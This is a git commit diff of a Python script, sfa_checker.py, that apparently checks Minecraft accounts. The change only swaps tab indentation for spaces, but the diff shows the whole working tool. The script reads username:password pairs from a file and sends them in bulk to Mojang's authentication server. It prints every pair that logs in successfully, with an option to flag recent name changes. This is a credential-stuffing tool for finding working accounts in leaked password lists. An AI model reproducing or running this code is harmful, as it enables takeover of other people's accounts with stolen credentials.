4c14b85bd09dde79cfe59943f8dda55160e049db
shantanu <me@shantanu.org>
2020-09-30 17:59:35 +0800

    Update sfa_checker.py

--- sfa_checker.py
+++ sfa_checker.py
@@ -8,40 +8,40 @@ combos = open("accounts.txt").read().splitlines()
 check_for_nc = False
 
 async def login(id, combo):
-	global check_for_nc
-	split = combo.split(":")
-	username = split[0]
-	password = split[1]
-	async with aiohttp.ClientSession() as session:
-		resp = await session.post("https://authserver.mojang.com/authenticate", json={ 'agent' : {"name" : "Minecraft", "version" : 1}, 'username': username, 'password': password})
-		jText = await resp.text()
-		if resp.status == 200:
-			if "Invalid credentials. Invalid username or password" in jText:
-				print(f'{username} failed to login!')
-				return
-			jLoaded = json.loads(jText)
-			uuid = jLoaded['selectedProfile']['id']
-			uname = jLoaded['selectedProfile']['name']
-			if check_for_nc:
-				resp = await session.get(f"https://api.mojang.com/user/profiles/{uuid}/names")
-				r2 = await resp.json()
-				for d in r2:
-					if d['name'].lower() == uname.lower():
-						if 'changedToAt' in d and int(d['changedToAt']) > ((time.time() * 1000) - 2592000000):
-							print(f'{uname}:{username}:{password} :: NAME CHANGED WITHIN LAST 30 DAYS')
-						else:
-							print(f'{uname}:{username}:{password}')
-		elif resp.status == 403:
-			print(f'You are blocked from sending requests due to sending too many in a short period of time')
-		else:
-			print(f'Request was not successful, server returned status {resp.status} for {username}')
+    global check_for_nc
+    split = combo.split(":")
+    username = split[0]
+    password = split[1]
+    async with aiohttp.ClientSession() as session:
+        resp = await session.post("https://authserver.mojang.com/authenticate", json={ 'agent' : {"name" : "Minecraft", "version" : 1}, 'username': username, 'password': password})
+        jText = await resp.text()
+        if resp.status == 200:
+            if "Invalid credentials. Invalid username or password" in jText:
+                print(f'{username} failed to login!')
+                return
+            jLoaded = json.loads(jText)
+            uuid = jLoaded['selectedProfile']['id']
+            uname = jLoaded['selectedProfile']['name']
+            if check_for_nc:
+                resp = await session.get(f"https://api.mojang.com/user/profiles/{uuid}/names")
+                r2 = await resp.json()
+                for d in r2:
+                    if d['name'].lower() == uname.lower():
+                        if 'changedToAt' in d and int(d['changedToAt']) > ((time.time() * 1000) - 2592000000):
+                            print(f'{uname}:{username}:{password} :: NAME CHANGED WITHIN LAST 30 DAYS')
+                        else:
+                            print(f'{uname}:{username}:{password}')
+        elif resp.status == 403:
+            print(f'You are blocked from sending requests due to sending too many in a short period of time')
+        else:
+            print(f'Request was not successful, server returned status {resp.status} for {username}')
 
 
 async def main():
-	global combos
-	tasks=[]
-	for i in range(len(combos)):
-		tasks.append(asyncio.ensure_future(login(i, combos[i])))
-	await asyncio.wait(tasks)
+    global combos
+    tasks=[]
+    for i in range(len(combos)):
+        tasks.append(asyncio.ensure_future(login(i, combos[i])))
+    await asyncio.wait(tasks)
 
 asyncio.run(main())
